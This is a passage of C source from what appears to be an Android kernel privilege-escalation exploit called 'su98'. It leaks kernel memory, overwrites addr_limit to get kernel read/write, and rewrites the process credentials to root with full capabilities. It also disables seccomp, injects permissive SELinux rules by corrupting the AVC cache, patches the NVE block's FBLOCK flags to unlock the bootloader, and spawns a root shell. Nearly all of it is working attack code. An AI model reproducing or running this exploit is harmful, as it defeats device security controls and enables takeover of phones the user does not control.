        error("Cannot leak kernel stack");

    for (unsigned int pos = 0; pos < sizeof(kstack_data) / 8; pos++)
        if (kstack_data[pos] == USER_DS)
            return kstack + pos * 8 - 8;

    return 0;
}

unsigned long find_selinux_enforcing() {
    unsigned long sel_read_enforce_addr = find_symbol("sel_read_enforce");
    if (sel_read_enforce_addr == 0) {
        message("Failed to find sel_read_enforce");
        return 0;
    }

    message("sel_read_enforce_addr: %lx", sel_read_enforce_addr);

    // Read the contents at this address
    unsigned char
        buffer[256]; // Assuming the relevant code is within the first 256 bytes
    if (kernel_read(sel_read_enforce_addr, buffer, 256) != 256) {
        message("Failed to read from sel_read_enforce");
        return 0;
    }

    const unsigned char asm_sub[] = {0xf3, 0x53, 0x01, 0xa9};
    for (int i = 0; i < 128; i++) {
        if (memcmp(&buffer[i], asm_sub, sizeof(asm_sub)) == 0) {
            unsigned long selinux_temp = 0;
            unsigned int offset_value = *(unsigned int *)&buffer[i + 12];
            selinux_temp = (offset_value & 0xFFFFE0) << 2;
            selinux_temp |= (offset_value & 0x60000000);

            if (selinux_temp & (1 << (21 - 1)))
                selinux_temp |= ~((1LL << 21) - 1);

            selinux_temp &= 0xFFFFFF;
            selinux_temp |= (selinux_temp >> 24) & 0xFF;
            selinux_temp <<= 7;
            selinux_temp += (sel_read_enforce_addr & 0xFFFFFFFFFFFFF000);

            unsigned int ldr_offset = *(unsigned int *)&buffer[i + 28];
            ldr_offset = (ldr_offset & 0x000FFF00) >> 8;
            selinux_temp |= ldr_offset;

            message("Found selinux_enforcing at %lx", selinux_temp);
            return selinux_temp;
        }
    }

    message("Failed to find selinux_enforcing");
    return 0;
}

static int32_t overwrite_avc_cache(uint64_t pAvcCache) {
    int32_t iRet = -1;
    uint64_t pAvcCacheSlot = 0;
    uint64_t pAvcDescision = 0;

    for (int32_t i = 0; i < AVC_CACHE_SLOTS; i++) {
        pAvcCacheSlot = kernel_read_ulong(pAvcCache + i * sizeof(uint64_t));

        while (0 != pAvcCacheSlot) {
            pAvcDescision = pAvcCacheSlot - DECISION_AVC_CACHE_OFFSET;

            if (sizeof(uint32_t) !=
                kernel_write_uint(pAvcDescision, AVC_DECISION_ALLOWALL)) {
                printf("[-] failed to overwrite avc_cache decision!\n");
                goto done;
            }

            pAvcCacheSlot = kernel_read_ulong(pAvcCacheSlot);
        }
    }

    iRet = 0;

done:

    return iRet;
}

static int32_t load_sepolicy_file(uint64_t pAvcCache,
                                  struct policy_file *pPolicyFile,
                                  policydb_t *pPolicyDb) {
    int32_t iRet = -1;
    char *pszPolicyFile = "/sys/fs/selinux/policy";
    int32_t iPolFd = -1;
    struct stat statbuff = {0};
    void *pPolicyMap = MAP_FAILED;

    iPolFd = open(pszPolicyFile, O_RDONLY);

    if (0 > iPolFd) {
        if (0 != overwrite_avc_cache(pAvcCache)) {
            message("SELINUX: failed to overwrite the avc cache!");
            goto done;
        }

        iPolFd = open(pszPolicyFile, O_RDONLY);

        if (0 > iPolFd) {
            message("SELINUX: failed to open specified sepolicy file!");
            goto done;
        }
    }

    if (0 != fstat(iPolFd, &statbuff)) {
        memset(&statbuff, 0, sizeof(struct stat));

        if (0 != overwrite_avc_cache(pAvcCache)) {
            message("SELINUX: failed to overwrite the avc cache!");
            goto done;
        }

        if (0 != fstat(iPolFd, &statbuff)) {
            message("SELINUX: failed to stat sepolicy file!");
            goto done;
        }
    }

    pPolicyMap = mmap(NULL, statbuff.st_size, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE, iPolFd, 0);

    if (MAP_FAILED == pPolicyMap) {
        if (0 != overwrite_avc_cache(pAvcCache)) {
            message("SELINUX: failed to overwrite the avc cache!");
            goto done;
        }

        pPolicyMap = mmap(NULL, statbuff.st_size, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE, iPolFd, 0);

        if (MAP_FAILED == pPolicyMap) {
            message("SELINUX: failed to map sepolicy file!");
            goto done;
        }
    }

    pPolicyFile->type = PF_USE_MEMORY;
    pPolicyFile->data = pPolicyMap;
    pPolicyFile->len = statbuff.st_size;

    if (0 != policydb_init(pPolicyDb)) {
        message("SELINUX: failed to initialize sepolicy database!");
        goto done;
    }

    if (0 != policydb_read(pPolicyDb, pPolicyFile, SEPOL_NOT_VERBOSE)) {
        message("SELINUX: failed to read sepolicy file!");
        goto done;
    }

    iRet = 0;

done:

    if (MAP_FAILED != pPolicyMap) {
        munmap(pPolicyMap, statbuff.st_size);
        pPolicyMap = MAP_FAILED;
    }

    if (0 <= iPolFd) {
        close(iPolFd);
        iPolFd = -1;
    }

    return iRet;
}

static int32_t get_current_selinux_context(uint64_t pAvcCache,
                                           char *pszSeCxtBuff) {
    int32_t iRet = -1;
    int32_t iSeCxtFd = -1;
    char szSeCxtFileBuff[MAX_SELINUX_CXT_LEN] = {0};
    char szSeCxtTokenBuff[MAX_SELINUX_CXT_LEN] = {0};
    char *pszSeCxtToken = NULL;

    iSeCxtFd = open("/proc/self/attr/current", O_RDONLY);

    if (0 > iSeCxtFd) {
        if (0 != overwrite_avc_cache(pAvcCache)) {
            message("SELINUX: failed to overwrite the avc cache!");
            goto done;
        }

        iSeCxtFd = open("/proc/self/attr/current", O_RDONLY);

        if (0 > iSeCxtFd) {
            message("SELINUX: failed to open current selinux context file!");
            goto done;
        }
    }

    if (0 >= read(iSeCxtFd, szSeCxtFileBuff, MAX_SELINUX_CXT_LEN)) {
        if (0 != overwrite_avc_cache(pAvcCache)) {
            message("SELINUX: failed to overwrite the avc cache!");
            goto done;
        }

        if (0 >= read(iSeCxtFd, szSeCxtFileBuff, MAX_SELINUX_CXT_LEN)) {
            message("SELINUX: failed to read current selinux context file!");
            goto done;
        }
    }

    strcpy(szSeCxtTokenBuff, szSeCxtFileBuff);
    pszSeCxtToken = strtok(szSeCxtTokenBuff, ":");

    for (int32_t i = 0; i < 2; i++) {
        if (NULL == pszSeCxtToken) {
            message("SELINUX: failed to parse current selinux context!");
            goto done;
        }

        pszSeCxtToken = strtok(NULL, ":");
    }

    strcpy(pszSeCxtBuff, pszSeCxtToken);

    iRet = 0;

done:

    if (0 <= iSeCxtFd) {
        close(iSeCxtFd);
        iSeCxtFd = -1;
    }

    return iRet;
}

static int32_t add_a_rule_to_sepolicy(char *pszSourceCxt, char *pszTargetCxt,
                                      char *pszClassCxt, char *pszPerm,
                                      policydb_t *pPolicyDb) {
    int32_t iRet = -1;
    type_datum_t *pSourceType = NULL;
    type_datum_t *pTargetType = NULL;
    class_datum_t *pClassType = NULL;
    perm_datum_t *pPermType = NULL;
    uint32_t uiPermVal = 0;
    avtab_key_t avtab_key = {0};
    avtab_datum_t *pAvType = NULL;

    pSourceType =
        (type_datum_t *)hashtab_search(pPolicyDb->p_types.table, pszSourceCxt);

    if (NULL == pSourceType) {
        message("SELINUX: failed to find source context in sepolicy database!");
        goto done;
    }

    pTargetType =
        (type_datum_t *)hashtab_search(pPolicyDb->p_types.table, pszTargetCxt);

    if (NULL == pTargetType) {
        message("SELINUX: failed to find target context in sepolicy database!");
        goto done;
    }

    pClassType = (class_datum_t *)hashtab_search(pPolicyDb->p_classes.table,
                                                 pszClassCxt);

    if (NULL == pClassType) {
        message("SELINUX: failed to find class context in sepolicy database!");
        goto done;
    }

    pPermType =
        (perm_datum_t *)hashtab_search(pClassType->permissions.table, pszPerm);

    if (NULL == pPermType) {
        if (NULL == pClassType->comdatum) {
            message("SELINUX: failed to find permission type in sepolicy "
                    "database!");
            goto done;
        }

        pPermType = (perm_datum_t *)hashtab_search(
            pClassType->comdatum->permissions.table, pszPerm);

        if (NULL == pPermType) {
            message("SELINUX: failed to find permission type in sepolicy "
                    "database!");
            goto done;
        }
    }

    uiPermVal |= 1U << (pPermType->s.value - 1);

    avtab_key.source_type = pSourceType->s.value;
    avtab_key.target_type = pTargetType->s.value;
    avtab_key.target_class = pClassType->s.value;
    avtab_key.specified = AVTAB_ALLOWED;

    pAvType = avtab_search(&pPolicyDb->te_avtab, &avtab_key);

    if (NULL == pAvType) {
        pAvType = (avtab_datum_t *)malloc(sizeof(avtab_datum_t));

        if (NULL == pAvType) {
            printf("[-] failed to allocate memory for new permission in "
                   "sepolicy database!\n");
            goto done;
        }

        memset(pAvType, 0, sizeof(avtab_datum_t));
        pAvType->data = uiPermVal;

        if (0 != avtab_insert(&pPolicyDb->te_avtab, &avtab_key, pAvType)) {
            printf("[-] failed to insert new permission into sepolicy "
                   "database!\n");
            goto done;
        }
    }

    pAvType->data |= uiPermVal;

    iRet = 0;

done:

    if ((0 != iRet) && (NULL != pAvType)) {
        free(pAvType);
        pAvType = NULL;
    }

    return iRet;
}

static int32_t add_rules_to_sepolicy(uint64_t pAvcCache,
                                     policydb_t *pPolicyDb) {
    int32_t iRet = -1;
    char szSeCxtBuff[MAX_SELINUX_CXT_LEN] = {0};

    if (0 != get_current_selinux_context(pAvcCache, szSeCxtBuff)) {
        message("SELINUX: failed to get current selinux context!");
        goto done;
    }

    message("SELINUX: current selinux context: %s", szSeCxtBuff);

    // allow dmesg
    if (0 != add_a_rule_to_sepolicy(szSeCxtBuff, "kmsg_device", "chr_file",
                                    "open", pPolicyDb)) {
        message("SELINUX: failed to add dmesg open rule to sepolicy!");
        goto done;
    }

    if (0 != add_a_rule_to_sepolicy(szSeCxtBuff, "kmsg_device", "chr_file",
                                    "read", pPolicyDb)) {
        message("SELINUX: failed to add dmesg read rule to sepolicy!");
        goto done;
    }

    if (0 != add_a_rule_to_sepolicy(szSeCxtBuff, "kernel", "system",
                                    "syslog_read", pPolicyDb)) {
        message("SELINUX: failed to add syslog_read rule to sepolicy!");
        goto done;
    }

    if (0 != add_a_rule_to_sepolicy("shell", "shell", "capability2", "syslog",
                                    pPolicyDb)) {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    // allow access to /proc/kmsg
    if (0 != add_a_rule_to_sepolicy(szSeCxtBuff, "kernel", "system",
                                    "syslog_mod", pPolicyDb)) {
        message("SELINUX: failed to add syslog_mod rule to sepolicy!");
        goto done;
    }

    // allow sepolicy loading
    if (0 != add_a_rule_to_sepolicy(szSeCxtBuff, "kernel", "security",
                                    "read_policy", pPolicyDb)) {
        message("SELINUX: failed to add read_policy rule to sepolicy!");
        goto done;
    }

    if (0 != add_a_rule_to_sepolicy(szSeCxtBuff, "kernel", "security",
                                    "load_policy", pPolicyDb)) {
        message("SELINUX: failed to add load_policy rule to sepolicy!");
        goto done;
    }

    // allow remount and write to rootfs
    if (0 != add_a_rule_to_sepolicy(szSeCxtBuff, "rootfs", "filesystem",
                                    "remount", pPolicyDb)) {
        message("SELINUX: failed to add rootfs remount rule to sepolicy!");
        goto done;
    }

    if (0 != add_a_rule_to_sepolicy(szSeCxtBuff, "rootfs", "dir", "write",
                                    pPolicyDb)) {
        message("SELINUX: failed to add rootfs write rule to sepolicy!");
        goto done;
    }

    if (0 != add_a_rule_to_sepolicy(szSeCxtBuff, "rootfs", "dir", "add_name",
                                    pPolicyDb)) {
        message("SELINUX: failed to add rootfs add_name rule to sepolicy!");
        goto done;
    }

    if (0 != add_a_rule_to_sepolicy(szSeCxtBuff, "rootfs", "file", "create",
                                    pPolicyDb)) {
        message("SELINUX: failed to add rootfs create rule to sepolicy!");
        goto done;
    }

    if (0 != add_a_rule_to_sepolicy(szSeCxtBuff, "rootfs", "file", "open",
                                    pPolicyDb)) {
        message("SELINUX: failed to add rootfs open rule to sepolicy!");
        goto done;
    }

    if (0 != add_a_rule_to_sepolicy(szSeCxtBuff, "rootfs", "file", "read",
                                    pPolicyDb)) {
        message("SELINUX: failed to add rootfs read rule to sepolicy!");
        goto done;
    }

    if (0 != add_a_rule_to_sepolicy(szSeCxtBuff, "rootfs", "file", "write",
                                    pPolicyDb)) {
        message("SELINUX: failed to add rootfs write rule to sepolicy!");
        goto done;
    }

    // allow kernel to execute rootfs file
    if (0 != add_a_rule_to_sepolicy("kernel", "rootfs", "file", "execute",
                                    pPolicyDb)) {
        message("SELINUX: failed to add rootfs execute rule to sepolicy!");
        goto done;
    }

    if (0 != add_a_rule_to_sepolicy("kernel", "rootfs", "file",
                                    "execute_no_trans", pPolicyDb)) {
        message(
            "SELINUX: failed add rootfs execute_no_trans rule to sepolicy!");
        goto done;
    }

    // allow kernel to read / write nvme
    if (0 != add_a_rule_to_sepolicy("shell", "nve_block_device", "blk_file",
                                    "read", pPolicyDb)) {
        message(
            "SELINUX: failed to add nvme_block_device read rule to sepolicy!");
        goto done;
    }

    if (0 != add_a_rule_to_sepolicy("shell", "nve_block_device", "blk_file",
                                    "open", pPolicyDb)) {
        message(
            "SELINUX: failed to add nvme_block_device open rule to sepolicy!");
        goto done;
    }

    if (0 != add_a_rule_to_sepolicy("shell", "nve_block_device", "blk_file",
                                    "write", pPolicyDb)) {
        message(
            "SELINUX: failed to add nvme_block_device write rule to sepolicy!");
        goto done;
    }

    // allow kernel to read / write /data/local/tmp
    if (0 != add_a_rule_to_sepolicy("shell", "shell", "capability", "dac_override", pPolicyDb)) {
        message(
            "SELINUX: failed to add dac_override rule to sepolicy!");
        goto done;
    }

    iRet = 0;

done:
    return iRet;
}

static int32_t inject_sepolicy(uint64_t pAvcCache, policydb_t *pPolicyDb) {
    int32_t iRet = -1;
    void *pSepolicyBinaryData = NULL;
    size_t sLen = 0;
    int32_t iPolFd = -1;

    if (0 != policydb_to_image(NULL, pPolicyDb, &pSepolicyBinaryData, &sLen)) {
        message("SELINUX: failed to convert sepolicy database to binary data!");
        goto done;
    }

    iPolFd = open("/sys/fs/selinux/load", O_RDWR);

    if (0 > iPolFd) {
        if (0 != overwrite_avc_cache(pAvcCache)) {
            message("SELINUX: failed to overwrite the avc cache!");
            goto done;
        }

        if (0 > iPolFd) {
            message("SELINUX: failed to open sepolicy load file!");
            goto done;
        }
    }

    if (sLen != write(iPolFd, pSepolicyBinaryData, sLen)) {
        if (0 != overwrite_avc_cache(pAvcCache)) {
            message("SELINUX: failed to overwrite the avc cache!");
            goto done;
        }

        if (sLen != write(iPolFd, pSepolicyBinaryData, sLen)) {
            message("SELINUX: failed to write sepolicy data to load file!");
            goto done;
        }
    }

    iRet = 0;

done:

    if (0 <= iPolFd) {
        close(iPolFd);
        iPolFd = -1;
    }

    return iRet;
}

int32_t do_selinux_bypass() {
    int32_t iRet = -1;
    uint64_t pAvcCache = 0;
    policydb_t policydb = {0};
    sidtab_t sidtab = {0};
    struct policy_file policyfile = {0};

    pAvcCache = find_symbol("avc_cache");

    if (!pAvcCache) {
        message("SELINUX: Unable to find avc_cache symbol");
        goto done;
    }

    message("SELINUX: avc_cache found at 0x%lx", pAvcCache);

    sepol_set_policydb(&policydb);
    sepol_set_sidtab(&sidtab);

    if (0 != load_sepolicy_file(pAvcCache, &policyfile, &policydb)) {
        message("SELINUX: Failed to load sepolicy file");
        goto done;
    }

    if (0 != add_rules_to_sepolicy(pAvcCache, &policydb)) {
        message("SELINUX: Failed to add rules to sepolicy");
        goto done;
    }

    message("SELINUX: Injecting sepolicy");

    if (0 != inject_sepolicy(pAvcCache, &policydb)) {
        message("SELINUX: Failed to inject sepolicy");
        goto done;
    }

    iRet = 0;

done:

    policydb_destroy(&policydb);
    return iRet;
}

const char *find_nve_block() {
    for (int i = 0; i < sizeof(kNvePaths) / sizeof(kNvePaths[0]); i++) {
        if (access(kNvePaths[i], F_OK) == 0) {
            message("NVE: Found nve block device at %s", kNvePaths[i]);
            return kNvePaths[i];
        }
    }
    return NULL;
}

int nve_backup_block(const char *nve_block, const char *dst) {
    int fd = open(nve_block, O_RDONLY);
    if (fd < 0)
        error("NVE: Failed to open nve block device");

    int fd_dst = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd_dst < 0)
        error("NVE: Failed to open destination file");

    unsigned char buffer[BLOCK_SIZE];
    ssize_t read_bytes;
    while ((read_bytes = read(fd, buffer, BLOCK_SIZE)) > 0) {
        if (write(fd_dst, buffer, read_bytes) != read_bytes) {
            close(fd);
            close(fd_dst);
            error("NVE: Failed to write to destination file");
        }
    }

    close(fd);
    close(fd_dst);
    message("NVE: Backed up nve block device to %s", dst);

    return 0;
}

bool nve_get_fblock_status(const char *nve_block) {
    int offset = 0;
    int count = 0;
    unsigned int fblock[7] = {0};

    int fd = open(nve_block, O_RDONLY);
    if (fd < 0)
        error("NVE: Failed to open nve block device");

    for (offset = 0; offset <= lseek(fd, 0, SEEK_END) - BLOCK_SIZE && count < 7;
         offset += BLOCK_SIZE) {
        unsigned char *data =
            mmap(NULL, BLOCK_SIZE, PROT_READ, MAP_SHARED, fd, offset);
        if (data == MAP_FAILED)
            error("NVE: Failed to mmap nve block device at 0x%lx", offset);

        unsigned char *ptr =
            memmem(data, BLOCK_SIZE, "FBLOCK", strlen("FBLOCK"));
        if (ptr != NULL) {
            fblock[count++] = ptr[20];
        }
        munmap(data, BLOCK_SIZE);
    }
    close(fd);

    int trueCount = 0;
    for (int i = 0; i < 7; i++) {
        if (fblock[i] == 1)
            trueCount++;
    }

    if (trueCount == 7) {
        return true;
    } else if (trueCount == 0) {
        return false;
    } else {
        message("NVE: Inconsistent FBLOCK entries found");
        return (trueCount >= 4);
    }
}

bool nve_set_fblock_status(const char *nve_block, unsigned char new_status) {
    int offset = 0;
    int count = 0;
    unsigned char buffer[BLOCK_SIZE];
    int fd = open(nve_block, O_RDWR);

    if (fd < 0)
        error("NVE: Failed to open nve block device");

    while ((read(fd, buffer, BLOCK_SIZE) > 0) && count < 7) {
        unsigned char *ptr =
            memmem(buffer, BLOCK_SIZE, "FBLOCK", strlen("FBLOCK"));
        while (ptr != NULL && count < 7) {
            int position =
                ptr - buffer + 20;
            if (position < BLOCK_SIZE) {
                ptr[20] = new_status;
                if (pwrite(fd, buffer, BLOCK_SIZE, offset) != BLOCK_SIZE) {
                    close(fd);
                    error("NVE: Failed to write changes to nve block device");
                }
                count++;
            }
            ptr = memmem(ptr + 1, BLOCK_SIZE - (ptr - buffer) - 1, "FBLOCK",
                         strlen("FBLOCK"));
        }
        offset += BLOCK_SIZE;
    }

    close(fd);
    message("NVE: Updated %d FBLOCK entries with new status %d", count,
            new_status);

    return count == 7;
}

int main(int argc, char **argv) {
    int command = 0;
    int dump = 0;
    int rejoinNS = 1;

    char result[PATH_MAX];
    ssize_t count = readlink("/proc/self/exe", result, PATH_MAX);
    char *p = strrchr(result, '/');
    if (p == NULL)
        p = result;
    else
        p++;
    *p = 0;

    p = strrchr(argv[0], '/');
    if (p == NULL)
        p = argv[0];
    else
        p++;

    myName = p;
    int n = p - argv[0];

    if (!strcmp(myName, "su")) {
        quiet = 1;
    }
    while (argc >= 2 && argv[1][0] == '-') {
        switch (argv[1][1]) {
        case 'q':
            quiet = 1;
            break;
        case 'v':
            puts("su98 version 2.0");
            exit(0);
            break;
        case 'c':
            command = 1;
            quiet = 1;
            break;
        default:
            break;
        }
        for (int i = 1; i < argc - 1; i++)
            argv[i] = argv[i + 1];
        argc--;
    }

    if (!dump && argc >= 2)
        quiet = 1;

    checkKernelVersion();

    message("MAIN: starting exploit for devices with waitqueue at 0x98");

    if (pipe(kernel_rw_pipe))
        error("kernel_rw_pipe");

    binder_fd = open("/dev/binder", O_RDONLY);
    epfd = epoll_create(1000);

    unsigned long task_struct_plus_8 = 0xDEADBEEFDEADBEEFul;
    unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;

    if (!leak_data_retry(NULL, 0, 0, NULL, 0, &task_struct_ptr,
                         &task_struct_plus_8)) {
        error("Failed to leak data");
    }

    unsigned long thread_info_ptr;

    if (task_struct_plus_8 == USER_DS) {
        message("MAIN: thread_info is in task_struct");
        thread_info_ptr = task_struct_ptr;
    } else {
        message("MAIN: thread_info should be in stack");
        thread_info_ptr = find_thread_info_ptr_kernel3(task_struct_plus_8);
        if (thread_info_ptr == 0)
            error("cannot find thread_info on kernel stack");
    }

    message("MAIN: task_struct_ptr = %lx", (unsigned long)task_struct_ptr);
    message("MAIN: thread_info_ptr = %lx", (unsigned long)thread_info_ptr);
    message("MAIN: Clobbering addr_limit");
    unsigned long const src = 0xFFFFFFFFFFFFFFFEul;

    if (!clobber_data_retry(thread_info_ptr + 8, &src, 8)) {
        error("Failed to clobber addr_limit");
    }

    message("MAIN: thread_info = 0x%lx", thread_info_ptr);

    setbuf(stdout, NULL);
    message("MAIN: should have stable kernel R/W now");

    message("MAIN: searching for cred offset in task_struct");
    unsigned char task_struct_data[PAGE + 16];
    kernel_read(task_struct_ptr, task_struct_data, PAGE);

    unsigned long offset_task_struct__cred = getCredOffset(task_struct_data);
    message("MAIN: cred offset = %lx", offset_task_struct__cred);

    message("MAIN: Leaking kernel pointer (might take a while)");
    quiet = 1;
    kptr_leak(task_struct_ptr);
    kptrInit = 1;
    kptr_leak(task_struct_ptr);
    quiet = 0;

    unsigned long cred_ptr =
        kernel_read_ulong(task_struct_ptr + offset_task_struct__cred);
    unsigned long real_cred_ptr =
        kernel_read_ulong(task_struct_ptr + offset_task_struct__cred - 8);
    message("MAIN: cred_ptr = %lx, real_cred_ptr = %lx", cred_ptr,
            real_cred_ptr);

    message("MAIN: Last successful search_base = %lx", search_base);
    unsigned long kptr_res = find_symbol("kptr_restrict") - 0x8a0;
    message("MAIN: kptr_restrict = %lx", kptr_res);
    kernel_write_uint(kptr_res, 0);
    pidAddr(task_struct_ptr);

    unsigned int oldUID = getuid();
    unsigned int newUid = 0;
    message("MAIN: setting root credentials with cred offset %lx",
            offset_task_struct__cred);

    for (int i = 0; i < 8; i++) {
        kernel_write_uint(cred_ptr + OFFSET__cred__uid + i * 4, newUid);
        kernel_write_uint(real_cred_ptr + OFFSET__cred__uid + i * 4, newUid);
    }

    if (getuid() != newUid)
        error("changing UIDs to %i", newUid);

    message("MAIN: UID = %i", newUid);
    message("MAIN: enabling capabilities");

    // Reset securebits
    kernel_write_uint(cred_ptr + OFFSET__cred__securebits, 0);
    kernel_write_ulong(cred_ptr + OFFSET__cred__cap_inheritable,
                       0x3fffffffffUL);
    kernel_write_ulong(cred_ptr + OFFSET__cred__cap_permitted, 0x3fffffffffUL);
    kernel_write_ulong(cred_ptr + OFFSET__cred__cap_effective, 0x3fffffffffUL);
    kernel_write_ulong(cred_ptr + OFFSET__cred__cap_bset, 0x3fffffffffUL);
    kernel_write_ulong(cred_ptr + OFFSET__cred__cap_ambient, 0x3fffffffffUL);

    int seccompStatus = prctl(PR_GET_SECCOMP);
    message("MAIN: SECCOMP status %d", seccompStatus);
    if (seccompStatus) {
        message("MAIN: disabling SECCOMP");
        kernel_write_ulong(thread_info_ptr + OFFSET__thread_info__flags, 0);
        int offset__task_struct__seccomp = getSeccompOffset(
            task_struct_data, offset_task_struct__cred, seccompStatus);
        if (offset__task_struct__seccomp < 0)
            message("MAIN: **FAIL** cannot find seccomp offset");
        else {
            message("MAIN: seccomp offset %lx", offset__task_struct__seccomp);
            kernel_write_ulong(task_struct_ptr + offset__task_struct__seccomp,
                               0);
            kernel_write_ulong(
                task_struct_ptr + offset__task_struct__seccomp + 8, 0);
            message("MAIN: SECCOMP status %d", prctl(PR_GET_SECCOMP));
        }
    }

    do_selinux_bypass();
    message("MAIN: root privileges ready");

    const char *nve_block = find_nve_block();
    if (nve_block == NULL)
        error("NVE: Cannot find nve block device");

    if (!nve_get_fblock_status(nve_block))
        message("MAIN: FBLOCK set to 0, is the device already unlocked?");

    nve_backup_block(nve_block, "/data/local/tmp/nve_block.bak");

    nve_set_fblock_status(nve_block, 0);
    if (!nve_get_fblock_status(nve_block)) {
        message("MAIN: Successfully unlocked FBLOCK!\n"
                "MAIN: Consider rebooting to bootloader");
    } else {
        message("NVE: **WARN** Unable to unlock FBLOCK");
    }

    if (command || argc == 2) {
        execlp("sh", "sh", "-c", argv[1], (char *)0);
    } else {
        message("MAIN: popping out root shell");
        execlp("sh", "sh", (char *)0);
    }

    exit(0);
}
